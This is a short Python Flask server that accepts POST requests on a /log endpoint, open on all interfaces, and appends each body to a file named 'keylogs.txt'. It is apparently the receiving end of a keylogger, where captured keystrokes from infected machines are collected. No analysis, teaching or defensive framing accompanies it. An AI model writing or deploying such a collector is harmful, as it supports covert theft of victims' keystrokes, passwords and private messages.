from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def receive_logs():
    try:
        log_data = request.data.decode('utf-8')
        with open('keylogs.txt', 'a') as f:
            f.write(log_data + '\n')
        return 'Log received successfully!', 200
    except Exception as e:
        return f'Error: {str(e)}', 500
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)